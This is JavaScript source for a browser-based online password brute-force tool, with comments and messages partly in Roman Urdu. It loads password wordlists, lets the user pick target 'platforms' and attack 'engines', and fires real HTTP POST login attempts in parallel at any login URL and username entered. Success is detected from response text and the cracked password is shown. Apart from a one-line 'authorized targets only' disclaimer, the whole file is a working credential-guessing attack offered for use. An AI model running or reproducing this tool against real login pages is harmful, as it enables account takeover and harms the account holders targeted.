/* ============================================================
   APP — REAL HTTP Brute Force Tool (No Simulation)
   Har attempt = genuine HTTP POST request.
   Developer: Nawab Zada Hacker ☠️🙌🦅 (Lab/Authorized Targets Only)
============================================================ */

const $ = id => document.getElementById(id);

const state = {
  platform: null, engine: null, mode: 'auto',
  running: false,
  attempts: 0, pool: [], startTime: 0, commonList: [],
  cracked: null, errs: 0
};

/* ================= MATRIX RAIN BACKGROUND ================= */
const cv = $('matrix'), cx = cv.getContext('2d');
let cols, drops, fs = 16;
function sizeCanvas(){
  cv.width = innerWidth; cv.height = innerHeight;
  cols = Math.floor(cv.width / fs); drops = Array(cols).fill(1);
}
sizeCanvas(); addEventListener('resize', sizeCanvas);
const chars = '01アイウエオカキクケコサシスセソ☠🦅';
function rain(){
  cx.fillStyle = 'rgba(5,5,7,0.08)'; cx.fillRect(0,0,cv.width,cv.height);
  cx.fillStyle = '#00ff88'; cx.font = fs + 'px monospace';
  for(let i=0;i<drops.length;i++){
    cx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fs, drops[i]*fs);
    if(drops[i]*fs > cv.height && Math.random() > .975) drops[i] = 0;
    drops[i]++;
  }
}
setInterval(rain, 50);

/* ================= RENDER PLATFORMS ================= */
const platBox = $('platforms'), engBox = $('engines');

PLATFORMS.forEach(p => {
  const d = document.createElement('div');
  d.className = 'plat'; d.dataset.id = p.id;
  d.innerHTML = `<span class="ico">${p.ico}</span><span class="nm">${p.name}</span>`;
  d.onclick = () => {
    document.querySelectorAll('.plat').forEach(x=>x.classList.remove('sel'));
    d.classList.add('sel'); d.style.setProperty('--pc', p.color);
    state.platform = p;
    logT(`🎯 Platform selected: ${p.ico} ${p.name} (wordlist flavor)`, 't-info');
  };
  platBox.appendChild(d);
});

/* ================= RENDER ENGINES ================= */
ENGINES.forEach(e => {
  const d = document.createElement('div');
  d.className = 'eng'; d.dataset.id = e.id;
  d.innerHTML = `<span class="eico">${e.ico}</span><div class="enm">${e.name}</div>
                 <div class="espd">⚡ ${e.speed} pwd/sec (rated)</div><div class="edesc">${e.desc}</div>`;
  d.onclick = () => {
    document.querySelectorAll('.eng').forEach(x=>x.classList.remove('sel'));
    d.classList.add('sel'); d.style.setProperty('--ec', e.color);
    state.engine = e;
    logT(`🔥 Engine selected: ${e.ico} ${e.name} — ${e.desc}`, 't-info');
  };
  engBox.appendChild(d);
});

/* ================= MODE ================= */
$('modeAuto').onclick   = () => setMode('auto');
$('modeCustom').onclick = () => setMode('custom');
function setMode(m){
  state.mode = m;
  $('modeAuto').classList.toggle('sel', m==='auto');
  $('modeCustom').classList.toggle('sel', m==='custom');
  $('customWrap').classList.toggle('show', m==='custom');
}
setMode('auto');

/* ================= TERMINAL ================= */
const term = $('term');
function logT(msg, cls='t-att'){
  const d = document.createElement('div');
  d.className = 't-line ' + cls; d.textContent = msg;
  term.appendChild(d);
  while(term.children.length > 300) term.removeChild(term.firstChild);
  term.scrollTop = term.scrollHeight;
}

/* ================= LOAD PASSWORD LISTS ================= */
async function loadCommon(){
  for(const file of ['passwords/basic-4000.txt','passwords/basic-1000.txt']){
    try{
      const r = await fetch(file);
      if(r.ok){
        const txt = await r.text();
        state.commonList = txt.split('\n').map(s=>s.trim()).filter(Boolean);
        logT(`📚 ${file} loaded — ${state.commonList.length} passwords ready for NCRACK`, 't-info');
        return;
      }
    }catch(e){}
  }
  logT('⚠️ Password list files nahi mili — fallback generator use hogi', 't-warn');
}

/* ================= BUILD POOL (engine-specific) ================= */
function buildPool(){
  if(state.mode === 'custom'){
    const p = $('customList').value.split('\n').map(s=>s.trim()).filter(Boolean);
    if(!p.length){ logT('❌ Custom password list khali hai — kuch passwords likho!', 't-err'); return null; }
    return shuffle(p);
  }
  const g = GENERATORS[state.engine.gen];
  const pool = (state.engine.gen === 'common')
    ? g(state.platform.id, state.commonList)
    : g(state.platform.id);
  return shuffle(pool);
}

/* ================= REAL LOGIN ATTEMPT (actual HTTP request) ================= */
async function tryLogin(user, pass){
  const url = $('url').value.trim();
  if(!url) return 'err';
  const uField = $('uField').value.trim() || 'username';
  const pField = $('pField').value.trim() || 'password';

  const body = new URLSearchParams();
  body.set(uField, user);
  body.set(pField, pass);

  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 10000); // 10s timeout per request
  try{
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
      credentials: 'omit',
      redirect: 'follow',
      signal: ctrl.signal
    });
    clearTimeout(t);
    const txt = await r.text();
    const bl = txt.toLowerCase();
    const okTxt   = $('okText').value.trim().toLowerCase();
    const failTxt = $('failText').value.trim().toLowerCase();

    if(okTxt && failTxt) return bl.includes(okTxt) && !bl.includes(failTxt);
    if(okTxt)            return bl.includes(okTxt);
    if(failTxt)          return !bl.includes(failTxt);
    return r.ok; // weak fallback: any 2xx = success
  }catch(e){
    clearTimeout(t);
    return 'err'; // network error / timeout
  }
}

/* ================= TEST ENDPOINT ================= */
async function probeEndpoint(){
  const url = $('url').value.trim();
  if(!url){ logT('❌ Pehle Login URL likho!', 't-err'); return; }
  const user = $('target').value.trim() || '__probe__';
  const uField = $('uField').value.trim() || 'username';
  const pField = $('pField').value.trim() || 'password';
  const body = new URLSearchParams();
  body.set(uField, user); body.set(pField, '__probe_pass__');
  logT('🔍 Testing endpoint...', 't-info');
  try{
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString()
    });
    const txt = (await r.text()).slice(0, 400);
    logT(`📡 Status : ${r.status} ${r.statusText}`, 't-info');
    logT(`📄 Response body (first 400 chars):\n${txt}`, 't-warn');
    logT('💡 Response me jo "success" wala text dikhe usay Success Text me, aur "fail" wala Failure Text me likho.', 't-info');
  }catch(e){
    logT(`❌ Request fail: ${e.message}`, 't-err');
    logT('💡 HTTPS page se http:// localhost block hota hai — tool ko bhi localhost se chalao (lab_server.py).', 't-warn');
  }
}

/* ================= START ATTACK (REAL) ================= */
async function startAttack(){
  if(state.running) return;
  const target = $('target').value.trim();
  const url = $('url').value.trim();
  if(!target){ logT('❌ ERROR: Pehle username / phone number likho!', 't-err'); return; }
  if(!url){ logT('❌ ERROR: Pehle Login URL likho! (e.g. http://127.0.0.1:8080/login)', 't-err'); return; }
  if(!state.platform){ logT('❌ ERROR: Pehle platform select karo!', 't-err'); return; }
  if(!state.engine){ logT('❌ ERROR: Pehle attack engine select karo!', 't-err'); return; }

  const pool = buildPool();
  if(!pool) return;
  if(state.mode==='auto' && state.engine.gen==='common' && !state.commonList.length){
    logT('⚠️ Common list khali hai — NCRACK fallback words use karega', 't-warn');
  }

  state.running = true; state.attempts = 0; state.pool = pool;
  state.startTime = Date.now(); state.errs = 0; state.cracked = null;

  const threads = Math.max(1, Math.min(10, parseInt($('threads').value) || 1));
  const delay   = Math.max(0, parseInt($('delay').value) || 0);

  $('btnStart').disabled = true; $('btnStop').disabled = false; $('btnTest').disabled = true;
  $('stStatus').textContent = 'ATTACKING'; $('stStatus').style.color = '#ff2b3a';
  $('stPool').textContent = pool.length.toLocaleString();
  term.innerHTML = '';

  logT('╔══════════════════════════════════════════════╗', 't-banner');
  logT('║  💀 REAL BRUTE FORCE ATTACK INITIATED 💀      ║', 't-banner');
  logT('╚══════════════════════════════════════════════╝', 't-banner');
  logT(`🎯 Username    : ${target}`, 't-info');
  logT(`🌐 Login URL   : ${url}`, 't-info');
  logT(`📱 Platform    : ${state.platform.ico} ${state.platform.name} (wordlist flavor)`, 't-info');
  logT(`🔥 Engine      : ${state.engine.ico} ${state.engine.name} — ${state.engine.gen} attack`, 't-info');
  logT(`🧠 Pool size   : ${pool.length.toLocaleString()} passwords`, 't-info');
  logT(`🧵 Threads     : ${threads}  |  Delay : ${delay}ms`, 't-info');
  logT('─── Real HTTP requests start ho gaye... ───', 't-warn');

  /* Fail-logging throttle: fast ho to terminal lag na kare */
  const shouldLogFail = () => {
    const n = state.attempts;
    if(n <= 500) return true;
    if(n <= 2000) return n % 10 === 0;
    return n % 100 === 0;
  };

  try{
    for(let i = 0; i < pool.length && state.running;){
      const slice = pool.slice(i, i + threads);
      const results = await Promise.all(slice.map(pw => tryLogin(target, pw)));
      let found = null;

      results.forEach((res, idx) => {
        const pw = slice[idx];
        state.attempts++;
        if(res === 'err'){
          state.errs++;
          logT(`⚠ [${pw}]  →  network error / timeout`, 't-warn');
        }else if(res === true){
          found = pw;
          logT(`✔ [${pw}]  →  *** MATCH FOUND ***`, 't-ok');
        }else if(shouldLogFail()){
          logT(`✖ [${pw}]  →  fail`, 't-att');
        }
      });

      i += threads;

      const secs = (Date.now() - state.startTime) / 1000;
      $('stAttempts').textContent = state.attempts.toLocaleString();
      $('stSpeed').textContent = Math.round(state.attempts / Math.max(1, secs)).toLocaleString();
      $('stTime').textContent = Math.floor(secs) + 's';
      const pct = Math.min(100, Math.round(state.attempts / pool.length * 100));
      $('bar').style.width = pct + '%';
      $('barPct').textContent = pct + '%';
      $('barTxt').textContent = `Trying: ${slice[slice.length-1]} ...`;

      if(found){ state.cracked = found; break; }
      if(delay > 0) await new Promise(r => setTimeout(r, delay));
    }
  }catch(e){
    logT(`❌ Unexpected error: ${e.message}`, 't-err');
  }

  const secs = (Date.now() - state.startTime) / 1000;
  logT(`📊 Total requests : ${state.attempts.toLocaleString()}  |  Time : ${secs.toFixed(1)}s  |  Errors : ${state.errs}`, 't-info');

  if(state.cracked){
    showSuccess(state.cracked, target);
  }else if(state.running){
    logT('❌ Pool khatam — password nahi mila. (List barao ya alag engine try karo)', 't-err');
  }else{
    logT('🛑 Attack stopped by user.', 't-warn');
  }
  finishRun();
}

function finishRun(){
  state.running = false;
  $('btnStart').disabled = false; $('btnStop').disabled = true; $('btnTest').disabled = false;
  $('stStatus').textContent = state.cracked ? 'CRACKED' : (state.attempts ? 'STOPPED' : 'IDLE');
  $('stStatus').style.color = state.cracked ? '#00ff88' : '#ffd000';
}

function stopAttack(){
  if(!state.running) return;
  state.running = false; // loop agle batch par check karega
  $('stStatus').textContent = 'STOPPING...';
}

/* ================= SUCCESS MODAL ================= */
function showSuccess(pw, target){
  $('mTarget').textContent = target;
  $('mPlat').textContent = state.platform.ico + ' ' + state.platform.name;
  $('mEng').textContent = state.engine.ico + ' ' + state.engine.name;
  $('mAtt').textContent = state.attempts.toLocaleString();
  $('mPass').textContent = pw;
  $('modal').classList.add('show');
  $('barTxt').textContent = '✅ PASSWORD CRACKED!';
  $('barTxt').style.color = '#00ff88';
}

$('btnStart').onclick = startAttack;
$('btnStop').onclick  = stopAttack;
$('btnTest').onclick  = probeEndpoint;
$('mClose').onclick = () => {
  $('modal').classList.remove('show');
  logT('🔄 Session reset. Naya attack shuru kar sakte ho. 💪', 't-info');
};

logT('🛡️ Tool ready! Platform select → username + Login URL likho → mode → engine → START. ☠️', 't-ok');
logT('💡 Pehle 🔍 Test Endpoint dabao taake fields verify ho jayein.', 't-info');
loadCommon();
